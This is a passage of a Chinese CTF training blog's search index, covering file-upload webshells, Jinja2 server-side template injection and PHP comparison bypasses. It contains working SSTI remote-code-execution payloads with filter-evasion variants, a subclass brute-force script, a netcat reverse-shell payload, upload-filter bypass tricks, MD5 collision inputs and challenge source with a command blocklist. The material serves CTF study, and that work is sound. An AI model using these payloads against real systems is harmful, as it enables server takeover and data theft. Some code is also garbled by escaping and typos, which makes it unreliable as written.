&#x27;&lt;/pre&gt;&#x27;;\n\n\n\n这个时候我们就可以通过cmd这个变量去执行任意指令接管计算机了\n当然一般情况我们会使用工具去进行连接。\n3.中国蚁剑这就是我们会用到的工具\n安装及原理：https://blog.csdn.net/hj06112/article/details/150274005\n其实原理就是利用上方的cmd变量去执行指令不过这里蚁剑自动帮你把指令输出执行并且把回显结果给返回给你。\n7732\n4.题目演练ctfhub-文件上传无验证\n\n游览上传我们写好的php木马\n\n\n相对路径\n打开蚁剑添加数据\n输入上传文件的位置，url\n以及我们的木马密码也就是一句话木马里的变量cmd\n\n\n\n然后找flag即可\n\n一些限制和绕过手段一.前端限制JavaScript前端文件上传验证一、基本概念JavaScript文件上传验证是一种纯前端验证手段，主要作用是在文件上传到服务器之前，在用户的浏览器中进行初步检查。\n二、主要作用1. 用户体验优化\n即时反馈：用户选择文件后立即得到反馈\n避免不必要的等待：在本地就过滤掉明显不合规的文件\n清晰的错误提示：直接告诉用户问题所在\n\n2. 减轻服务器负担\n过滤掉超大的文件（如超过限制的）\n过滤掉明显错误的文件类型\n减少无效请求到服务器\n\n3. 基本安全检查\n检查文件扩展名（.jpg&#x2F;.png等）\n检查文件大小\n检查MIME类型\n\n简单绕过方法1. 禁用JavaScript\n浏览器设置中关闭JavaScript\n使用NoScript等插件\n\n2. 使用BurpSuite等工具\n拦截HTTP请求\n直接修改文件名和内容\n绕过所有前端检查\n\n二、服务端检测绕过2.1 扩展名检查原理：黑名单&#x2F;白名单验证文件扩展名绕过方法：\n\nIIS6目录解析：/.asp/目录下所有文件按ASP解析\nIIS6分号漏洞：a.asp;jpg被解析为ASP\nWindows空格和点：a.php.或a.php[空格]存储后去除点和空格\nNginx空字节：xxx.jpg%00.php解析为PHP\nApache解析：a.php.rar从右向左识别为PHP\n\n2.2 Content-Type检查原理：检查HTTP头中的MIME类型绕过方法：使用BurpSuite修改Content-Type为允许的类型\n2.3 文件头检测原理：检查文件头部特征（前10字节）绕过方法：给脚本文件添加对应的文件头\n2.4 限制Web服务器行为原理：限制特定目录的脚本执行权限\n绕过方法：上传.htaccess文件覆盖服务器配置\n2.5 00截断原理：文件系统遇到0x00认为文件结束绕过方法：将文件名如evil.php.jpg改为evil.php%00.jpg\n（绕过方法希望大家能自己去多了解这里不做过多的赘述，培训更多的是想让大家了解漏洞的底层逻辑）\n内容检查的绕过一些png上传会检查是否有&lt;?类似程序开头的php代码如何绕过，也就是头部检查\n","tags":["文件上传"]},{"title":"SSTI","url":"/2026/02/05/SSTI/","content":"SSTISSTI是一种服务器端模板注入漏洞，发生在应用程序使用模板引擎渲染用户输入时未能正确过滤或转义用户提供的内容。\n漏洞成因服务端没有对用户输入做处理，将其变成了web应用模板内容的一部分。模板引擎在编译渲染的过程中，会执行用户插入的语句。可能导致敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。\n模板引擎（web开发的模板引擎）写题最常见的模板是python的模板，从后端程序员的角度这个漏洞源自于程序员偷懒将render_template_string解析字符串代替了render_template的渲染。做题时可以用wapplayzer插件，查看框架和语言，一般是Flask和Python的话就很有可能是SSTI当然jinjia2（一种python模板引擎是flask框架下的）也是明显提示。\n常见的stti漏洞一般都存在于跟用户输入有关的地方比如：欢迎用户进入、留言板之类的地方。\nSSTI漏洞的应用这里用最常见的python模板举例\n在模板注入前我们要知道大多数框架下的模板引擎是运行访问对象的类，并通过类继承链访问父类或子类。可以理解为一种魔术方法，而这里面就包括可以做到RCE的类。\n被\\&#123;\\&#123;\\&#125;\\&#125;包裹的内容在模板渲染会被当做变量解析替换，因此 text \\&#123;\\&#123;7*7\\&#125;\\&#125;  会被执行运算生成49，这也是测试漏洞的方法。\n__class__ ：返回类型所属的对象。（返回你所属的张家）__base__  ：返回该对象所继承的父类（返回你爹的名字）__mro__ ：返回该对象的所有父类（返回你家族谱）__subclasses__() ：获取当前类的所有子类（返回你的所有孩子）__init__ ： 类的初始化方法（构造函数）__globals__ ： 对包含(保存)函数全局变量的字典的引用（你家中所有物品）\n\n我们可以用当前类，通过class返回对象，然后用mro或者base返回父类，直到父类为object类（所有的类都是object类的子类），再用sublasses返回所有的子类，这样就能找到存在rce的类。\n当前类可以这样表示：\n&#x27;&#x27;.__class__ ().__class__ [].__class__ &quot;&quot;.__class__ &#123;&#125;.__class__\n\n构造\n&#123; &#123;&#x27;&#x27;.__class__.__base__.__subclasses__\\&#125;\\&#125;\n\n查看所有类\n其中已知的可以进行rce的类是os._wrap_close，我们可以找到它的序号（查询所有类后去找（可以试试AI）或者用脚本）\nimport requestsurl =input(&#x27;请输入URL链接：)for i in range(500):data =&#123;&quot;name&quot;:&quot;\\&#123;\\&#123;O)._class_._base_.__subclasses_()[&quot;+str(i)+&quot;]._init_._globals_[&#x27;__builtins_1\\&#125;\\&#125;&quot;]try:response = requests.posf(url,data=data)#print(response.text)if response.status_code == 200:if &#x27;popen&#x27; in response.text:print(i)except:pass\n\n假设是132那我们就可以这样构造payload，__init__可以初始化类 globals则可以寻找popen然后直接命令执行，最后加一个read()\n\\&#123;\\&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat%20/flag&#x27;).read()\\&#125;\\&#125;\n\n这个时候我们就成功调用了popen，可以直接进行命令执行。\n绕过方法常见会被过滤的有数字，因为这里面我们调用os._wrap_close是用数字实现的\n1.更改模块\\&#123;\\&#123;a.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;)\\&#125;\\&#125; 采用了builtins模块，比用os_wrap_close更加方便\n\n2.采用全角数字（在花括号等被过滤的时候也可以进行绕过）\n3.用request绕过request可以获得请求的相关信息，通过这个特性可以做到绕过\n用‘’也可以\n例如\\&#123;\\&#123;&#x27;&#x27;.__class__\\&#125;\\&#125; 改为\\&#123;\\&#123;&#x27;&#x27;[request.args.t1]\\&#125;\\&#125;&amp;t1=__class__ __class__ 改为 _&#x27;&#x27;_cla&#x27;&#x27;ss_&#x27;&#x27;_\n\n\n这里的request不是python的库而是flask的内部函数 这里把request里的所有东西都展示出来 request.args.key #获取get传入的key的值 request.form.key #获取post传入参数(Content-Type:applicaation&#x2F;x-www-form-urlencoded或multipart&#x2F;form-data) reguest.values.key #获取所有参数，如果get和post有同一个参数，post的参数会覆盖get request.cookies.key #获取cookies传入参数 request.headers.key #获取请求头请求参数 request.data #获取post传入参数(Content-Type:a&#x2F;b) request.json #获取post传入json参数 (Content-Type: application&#x2F;json)\n4.’’被过滤‘’被过滤意味着builtins和import的使用会被限制这里可以使用request.args.x(这里x为get的参数)来绕过\npayload\n\\&#123;\\&#123;a.__init__.__globals__[request.args.x].eval(request.args.y)\\&#125;\\&#125;&amp;x=__builtins__&amp;y=__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()\n\n同时如果args被ban了可以把request.args.x替换成request[&#39;value&#39;][&#39;x&#39;]\nrequest.cookies.x也可以作为代替，传参要传在cookies中\ncookies里头的参数要加;\n5.解决request被ban问题chr()拼接，但是chr()无法直接被使用，要通过走继承链的方式提取chr()函数\n一些chr()的构造方式&quot;&quot;.__class__.__base__.__subclasses__()[x].__init__.__globals__[&#x27;__builtins__&#x27;].chrget_flashed_messages.__globals__[&#x27;__builtins__&#x27;].chrurl_for.__globals__[&#x27;__builtins__&#x27;].chrlipsum.__globals__[&#x27;__builtins__&#x27;].chrx.__init__.__globals__[&#x27;__builtins__&#x27;].chr  (x为任意值)\n\n然后这时候用字符串（变量）chr接收这个chr函数我们就可以使用chr()来进行拼接绕过了\n \\&#123;% set chr= &#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__base__&#x27;][&#x27;__subclasses__&#x27;]()[137][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;chr&#x27;]%\\&#125;（这一步是接收）\\&#123;% set cmd=&#x27;cat &#x27;~chr(47)~&#x27;flag&#x27; %\\&#125;（绕过 /）\\&#123;%print(&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__base__&#x27;][&#x27;__subclasses__&#x27;]()[137][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;popen&#x27;](cmd)[&#x27;read&#x27;]())%\\&#125;（读取）\n\n~是jinjia2独有的字符串连接符\n6 .     . 绕过可以用atter()绕过，也可以用[ ]绕过（就是只是把.后面内容放进中括号再用‘ ’包起来就行）\n|attr(&quot;__class__&quot;)就相当于.__class__\n\n示例\n\\&#123;\\&#123;lipsum|attr(&quot;__globals__&quot;)|attr(&quot;get&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;whoami&quot;)|attr(&quot;read&quot;)()\\&#125;\\&#125;这里这个pyload是改自\\&#123;\\&#123;lipsum._globals_.get(&quot;os&quot;).popen(&#x27;whoami&#x27;).read()\\&#125;\\&#125;这里值得注意的是（不用get）\\&#123;\\&#123;lipsum._globals_.os.popen(&#x27;whoami&#x27;).read()\\&#125;\\&#125;是成立的但是，\\&#123;\\&#123;lipsum|attr(&quot;__globals__&quot;)|attr(&quot;get&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;whoami&quot;)|attr(&quot;read&quot;)()\\&#125;\\&#125;如果不加get，就会失败\n\n7.\\&#123;\\&#123;\\&#125;\\&#125;绕过用\\&#123;%%\\&#125;但是要加print\n8._下划线绕过以编码绕过 python解析器支持 hex ，unicode编码，全角字符也可以\n9.关键字过滤这里举例子比如\\&#123;\\&#123;lipsum.__globals__.os.popen(&#39;ls&#39;).read()\\&#125;\\&#125;\n改成\\&#123;\\&#123;lipsum[&#39;__glob&#39;&#39;als__&#39;][&#39;os&#39;][&#39;po&#39;&#39;pen&#39;](&#39;ls&#39;).read()\\&#125;\\&#125;\n10.无回显SSTI只会显示对或者不对\n写静态文件\n在 Flask 中，静态目录（Static Directory） 是用于存储静态文件（如 CSS、JavaScript、图片等）的特殊目录，这些文件不需要服务器端处理，可以直接发送给客户端。\n相关目录演示\nproject/├── app.py├── static/│   ├── css/style.css│   ├── js/script.js│   └── images/logo.png└── templates/\n\n\\&#123;\\&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;echo &quot;hhh&quot; &gt;/app/static/1.txt&#x27;).read()\\&#125;\\&#125;\n\n1.txt写入静态文件\n这时候就可以通过静态文件执行命令了\n\\&#123;\\&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27; ls &gt;/app/static/1.txt&#x27;).read()\\&#125;\\&#125;\n\n反弹shell用云服务器监听端口\n\\&#123;\\&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;nc 127.0.0.1 2333 -e /bin/bash&#x27;).read()\\&#125;\\&#125;\n\n可以在云服务器上进行交互ls等命令执行\n","tags":["SSTI"]},{"title":"那些比较的绕过（php特性）","url":"/2026/02/14/%E9%82%A3%E4%BA%9B%E6%AF%94%E8%BE%83%E7%9A%84%E7%BB%95%E8%BF%87(php%E7%89%B9%E6%80%A7)/","content":"比较绕过（php特性）在PHP开发中，弱比较（==运算符）的自动类型转换特性可能导致非预期结果，尤其在安全敏感场景中可能引发漏洞。还有就是一些函数判断不严谨导致可以绕过。\n1.字符串和数字字符串开头为数字时，以开头数字（到字母出现为止）作为转换后的结果。开头不是数字的或者什么都没有的转换为0。\n&#x27;1&#x27; == 1&#x27;1a&#x27;== 1&#x27;as123&#x27;== 0\n\n2.布尔值与任意值比较布尔值除了0为假和其他任意字符串都相等\n&#x27;miao&#x27; == true&#x27;flase&#x27; == true123 == true0 == flase\n\n3.hash值和字符串“0”比较hash开头为0e后面为数字时，进行比较时就会将其当做科学计数法来计算，用计算出的结果来进行比较。而在弱比较中由于有e字母的出现就会导致其弱比较&#x3D;&#x3D;0\nmd5($str1)=0e830400451993494058024219903391md5($str2) == &#x27;0&#x27;\t//true\n\n4.strcmp（str1,str2）&#x3D;&#x3D; 0函数这个函数用来比较两个字符串是否相等,原理是组个字节比较ASCII值\n两字符串相等返回0str1 &lt; str2 : 返回 &lt; 0str1 &gt; str2 : 返回 &gt; 0\n\nPHP 官方文档说明：strcmp() 期望接收字符串类型的参数。如果传入其他类型（数组、数字、对象等），PHP 会尝试进行类型转换，但转换失败或出现意外时，会导致函数行为异常。\n传入数组\n$flag = &quot;flag&#123;this_is_flag&#125;&quot;;$user_input = $_GET[&#x27;password&#x27;];  // 假设用户输入 ?password[]=123if (strcmp($user_input, $flag) == 0) &#123;    echo &quot;Login successful!&quot;;&#125; else &#123;    echo &quot;Login failed!&quot;;&#125;\n\n此时输入的数组由于数组是无法转换成字符串的，所以会warning函数会返回Null而此时Null在弱比较中是&#x3D;&#x3D;0的所以可以绕过。\n5.switch()绕过和弱比较差不多会将参数转换成int值\n&lt;?php$user_input = &quot;0e12345&quot;;  // 用户输入switch ($user_input) &#123;    case 0:        echo &quot;Bypassed! Case 0 matched!\\n&quot;;        break;    case &quot;secret&quot;:        echo &quot;Secret matched!\\n&quot;;        break;    default:        echo &quot;No match\\n&quot;;&#125;// 输出：Bypassed! Case 0 matched!?&gt;\n\n6.intval()函数这个函数主要是用来获取变量的整数值的\necho intval(42);        // 42echo intval(4.2);       // 4（遇到小数点停止）echo intval(&quot;42&quot;);      // 42echo intval(&quot;42abc&quot;);   // 42（遇到字母时停止）echo intval(&quot;abc42&quot;);   // 0echo intval(&quot;0x1A&quot;);    // 26（十六进制，取决于 base）\n\n$num=2e5intval($num)&lt;2020 &amp;&amp; intval($num+1)&gt;2021\n\n第一个为2 第二个由于先执行运算会导致科学计数被转换为实际数值\n7.is_numeric(mix $var)函数绕过&lt;?php// 1. 十进制数字is_numeric(123);        // trueis_numeric(&#x27;123&#x27;);      // true// 2. 浮点数is_numeric(&#x27;123.0&#x27;);    // trueis_numeric(123.0);      // true// 3. 十六进制数字（不是字符串！）is_numeric(0x61646D696E);   //&quot;admin&quot;-&gt; true// 0x61646D696E 是十六进制整数，在内存中已经是数值，不是字符串// 0x61646D696E 会转换为十进制// 4. 十六进制字符串is_numeric(&#x27;0x776179&#x27;); // false ← 这才是字符串形式的十六进制// 5. 其他is_numeric(&#x27;123a&#x27;);     // falseis_numeric(&#x27;123 &#x27;);     // false?&gt;\n\n8.&#x3D;&#x3D;&#x3D;强比较绕过一般强比较绕过都是利用相同的MD5强碰撞进行绕过。\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\n\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\n\na=0e306561559aa787d00bc6f70bbdfe3404cf03659e704f8534c00ffb659c4c8740cc942feb2da115a3f4155cbb8607497386656d7d1f34a42059d78f5a8dd1efb=0e306561559aa787d00bc6f70bbdfe3404cf03659e744f8534c00ffb659c4c8740cc942feb2da115a3f415dcbb8607497386656d7d1f34a42059d78f5a8dd1ef\n\n示例：[安洵杯 2019]easy_web（前面塞了一个文件查询）\n&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#x27;content-type:text/html;charset=utf-8&#x27;);$cmd = $_GET[&#x27;cmd&#x27;];if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;]))     header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123;    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;    die(&quot;xixiï½ no flag&quot;);&#125; else &#123;    $txt = base64_encode(file_get_contents($file));    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;    echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;&#125; else &#123;    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;        echo `$cmd`;    &#125; else &#123;        echo (&quot;md5 is funny ~&quot;);    &#125;&#125;?&gt;\n\nif ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;        echo `$cmd`;\n\n这里就需要md5的碰撞了。\n示例2：[MRCTF2020]Ez_bypass\nI put something in F12 for you include &#x27;flag.php&#x27;; $flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;; if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123; $id=$_GET[&#x27;id&#x27;]; $gg=$_GET[&#x27;gg&#x27;]; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123; echo &#x27;You got the first step&#x27;; if(isset($_POST[&#x27;passwd&#x27;])) &#123; $passwd=$_POST[&#x27;passwd&#x27;]; if (!is_numeric($passwd)) &#123; if($passwd==1234567) &#123; echo &#x27;Good Job!&#x27;; highlight_file(&#x27;flag.php&#x27;); die(&#x27;By Retr_0&#x27;); &#125; else &#123; echo &quot;can you think twice??&quot;; &#125; &#125; else&#123; echo &#x27;You can not get it !&#x27;; &#125; &#125; else&#123; die(&#x27;only one way to get the flag&#x27;); &#125; &#125; else &#123; echo &quot;You are not a real hacker!&quot;; &#125; &#125; else&#123; die(&#x27;Please input first&#x27;); &#125; &#125;\n\nmd5碰撞加上is_numberic的反向绕过和 &#x3D;&#x3D; 弱比较。\n","tags":["php特性"]}]